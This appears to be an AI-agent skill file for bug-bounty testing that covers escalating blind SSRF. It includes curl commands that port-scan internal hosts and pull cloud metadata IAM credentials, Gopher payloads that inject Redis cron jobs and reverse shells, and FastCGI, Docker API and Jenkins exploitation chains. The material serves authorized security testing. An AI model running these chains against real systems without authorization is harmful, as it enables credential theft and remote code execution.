---
name: blind-ssrf-chains
description: "Escalate blind SSRF to proven impact via internal service canaries, port fingerprinting, chained exploitation targeting Redis, Docker API, Jenkins, and cloud metadata, and attacker-controlled infrastructure for dangling resource claims and redirect servers. Use when blind SSRF is confirmed but you need to demonstrate CIA impact beyond 'I can reach internal hosts.'"
---
# Blind SSRF Chains

You have blind SSRF. You can hit internal IPs but get no response body. The program will reject "I can reach 127.0.0.1." You need to prove impact.

## Attacker Infrastructure for SSRF Proof

When SSRF is confirmed but you need attacker-controlled infrastructure to complete the chain (claim a dangling bucket, serve redirects, host custom content for a parser), do not guess or auto-provision. Detect what cloud/hosting CLIs are on the shell (`which aws az gcloud fly netlify wrangler docker ngrok`), present the available options and what the situation requires, then use AskUserQuestion for approval and credential guidance. Do not block other testing while waiting.

**Trigger signals:**
- Server response contains `NoSuchBucket`, `BlobNotFound`, or similar dangling cloud resource error — claim the resource name, upload payload
- SSRF follows redirects but you need a reliable controlled redirector (httpbin.org rate-limits) — deploy a minimal 302 server
- Server fetches and parses attacker content (PEM, XML, JSON, WSDL) but OOB callback can only receive, not serve — host a file at a public URL

**S3 redirect caveat:** `x-amz-website-redirect-location` metadata only fires on the S3 website endpoint (`bucket.s3-website-region.amazonaws.com`), not the REST API path-style URL (`s3.amazonaws.com/bucket/key`). If the server uses path-style, content injection is the finding, not the redirect chain.

**Cleanup is mandatory.** Tear down all provisioned infrastructure after triage. Log what you created in the gadget ledger.

## Constraint Assessment (do this FIRST)

Before attempting any chain, map what your SSRF primitive actually allows. Most techniques below require specific capabilities — if your primitive is constrained, skip to the viable subset.

| Constraint | What it blocks | What remains viable |
|---|---|---|
| HTTPS-only (no HTTP) | Redis, FastCGI, Memcache, most internal services, **cloud metadata** (IMDSv1 is HTTP on 169.254.169.254:80) | Canaries on HTTPS internal services only; cloud metadata blocked unless IMDSv2 on HTTPS or instance identity endpoint available |
| No Gopher protocol | Redis cmd injection, FastCGI, MySQL, Memcache | HTTP-only targets: Jenkins, Solr, Docker API, Consul, cloud metadata |
| No port specification | Port scanning, non-standard service targeting | Default-port services only (80/443), cloud metadata (169.254.169.254) |
| No query parameters | Solr shard canary, Jenkins crumbIssuer, most canary endpoints | Path-only targets: Docker `/containers/json`, cloud metadata, Elasticsearch `/_search` |
| No redirect following | Redirect-based protocol downgrade, SSRF redirect chains | Direct-hit targets only |
| POST-only / fixed body | GET-based canary endpoints, Jenkins script compilation | POST-accepting endpoints (Docker API create, some webhooks) |
| No response body or timing oracle | Fingerprinting, all response-based inference | OOB callbacks only (if outbound from internal services) |

**If your primitive is POST-only + HTTPS-only + no ports + no query params + no redirects + blind:** Standard chains are all blocked. Note: HTTPS-only also blocks standard cloud metadata (IMDSv1 at 169.254.169.254 is HTTP on port 80). Your only paths are: (1) self-referencing SSRF to internal subdomains on 443 that make secondary outbound requests, (2) DNS rebinding to bypass IP restrictions. If none of these are viable, document the blind SSRF as a lead and move on — don't burn context on dead chains.

## The Canary Principle

Don't try to read responses from the SSRF — find internal services that make **secondary outbound requests** to infrastructure you control. The chain: your request → SSRF → internal service → outbound fetch → your OOB callback. The callback proves the internal service exists AND is exploitable.

**OOB callback setup**: Use the `CallbackClient` tool to register a callback URL before testing. Request HTTPS protocol — many internal services only make HTTPS outbound requests. After triggering the SSRF chain, check for received callbacks to confirm the internal service made an outbound request.

**Checkpoint:** Before attempting payloads, confirm blind SSRF with a canary: `?url=http://YOUR-OOB-SERVER/ssrf-test`. If no callback received, the SSRF may not be server-side.

## Fingerprinting (Blind)

## Fingerprinting Without Response Bodies

You can't see responses, but you can measure:

- **Status code delta** — live service returns 200, dead port returns 500/timeout. The SSRF endpoint leaks this through its own response behavior.
- **Response size delta** — byte count differs between hit and miss. Even 1 byte difference confirms service presence.
- **Timing delta** — connected ports respond faster than filtered. Measurable even through the SSRF proxy layer.
- **Error oracle** — the SSRF endpoint's error handler may leak distinct strings per backend failure mode.

Combine these to port-scan internally and build a service map before attempting exploitation.

## Target Prioritization

When you've confirmed internal reachability, prioritize by **impact density** — services where a single unauthenticated request yields RCE or data access:

1. **Redis (6379)** — Gopher protocol to inject commands. Cron write = RCE. If GitLab is present, Redis queue injection = RCE via Resque workers.
2. **Docker API (2375/2376)** — Unauthenticated container creation with host bind mount = instant RCE. Check `/containers/json` first.
3. **Consul/etcd (8500/2379)** — Service registration + health check callbacks to canary. May contain secrets in KV store.
4. **Jenkins (8080)** — Groovy script compilation endpoint accepts `@Grab` annotations that fetch from attacker URLs. Pre-auth on many installs.
5. **Elasticsearch (9200)** — Data exfil via `/_search`. Older versions allow shutdown via `/_shutdown`.
6. **FastCGI (9000)** — Gopher to inject PHP via `auto_prepend_file`. Use Gopherus to generate payloads.
7. **Solr (8983)** — Shard parameter accepts arbitrary URLs (canary). XXE via `xmlparser` query parser.
8. **Jira/Confluence (8080/8443)** — Multiple CVEs with unauthenticated SSRF endpoints that act as canaries.

## Example: Blind SSRF → Port Scan → HTTP Canary → Cloud Metadata

```bash
# 1. Get OOB callback URL (use CallbackClient tool)
# CALLBACK=<your callback URL from CallbackClient>

# 2. Port scan internal services via timing
for port in 6379 8080 8983 9200 2375; do
  t=$(curl -s -o /dev/null -w "%{time_total}" "$TARGET/fetch?url=http://127.0.0.1:$port/")
  echo "Port $port: ${t}s"
done
# Fast response = open port. Timeout = closed/filtered.

# 3. Fingerprint Jenkins on internal port 8080 (pre-auth crumbIssuer)
curl -s -o /dev/null -w "%{http_code}" \
  "$TARGET/fetch?url=http://127.0.0.1:8080/crumbIssuer/api/json"
# 200 = Jenkins present, 500/timeout = not Jenkins

# 4. Use Solr shard parameter as canary (triggers outbound fetch)
curl -s "$TARGET/fetch?url=http://127.0.0.1:8983/solr/admin/cores?action=STATUS%26shards=${CALLBACK}"

# 5. Check for OOB callback — confirms internal Solr made outbound request
# Use CallbackClient tool to check for received requests

# 6. If callback received, escalate: cloud metadata via SSRF
curl -s "$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

## Decision Logic

```
Blind SSRF confirmed
  ├── Can you use Gopher protocol?
  │     ├── Yes → Target Redis, FastCGI, Memcache (direct command injection)
  │     └── No  → Target HTTP services only (Jenkins, Solr, Jira, Docker API)
  ├── Do you need to prove outbound connectivity?
  │     └── Use canary endpoints (Jenkins createToken, Solr shards, Jira icon-uri, Hystrix proxy.stream)
  ├── Do you know the internal stack?
  │     ├── Yes → Target the highest-impact service directly
  │     └── No  → Fingerprint via timing/size deltas on common ports, then prioritize
  └── Is cloud metadata reachable?
        └── 169.254.169.254 → credentials → lateral movement (often higher impact than direct service exploitation)
```

## Example Chain: Gopher → Redis Cron Write → RCE

When the SSRF primitive supports Gopher protocol and Redis is on port 6379:

```bash
# 1. Generate Redis cron-write payload with Gopherus
# Gopherus generates Gopher payloads for Redis, FastCGI, MySQL, PostgreSQL, Memcache
gopherus --exploit redis  # select "RCE", enter reverse shell cron job

# 2. Send Gopher payload via SSRF (Redis on 192.168.1.10:6379)
curl -s "$TARGET/fetch?url=gopher://192.168.1.10:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A..."

# 3. Fallback: FastCGI on port 9000 via Gopher (PHP auto_prepend_file injection)
gopherus --exploit fastcgi  # generates PHP code execution payload
curl -s "$TARGET/fetch?url=gopher://192.168.1.10:9000/_%01%01..."

# 4. GitLab-specific: If Ruby/GitLab detected, inject into Redis Resque queue
# instead of cron write — Resque workers execute serialized Ruby jobs from Redis
# This gives RCE via GitLab's background job processor without writing to disk
```

**Priority order**: Redis cron write (broadest) → GitLab Resque queue injection (if GitLab present, more reliable than cron) → FastCGI auto_prepend_file (requires PHP behind FastCGI).

## Chain With

- **ssrf-ip-filter-bypass** — get past IP filters to reach internal services
- **ssrf-redirect-loop** — upgrade blind to visible via redirect error differentials
- **CallbackClient tool** — register OOB callback URLs for canary verification
- **Gopherus** (external) — generate Gopher payloads for Redis, FastCGI, MySQL, PostgreSQL, Memcache
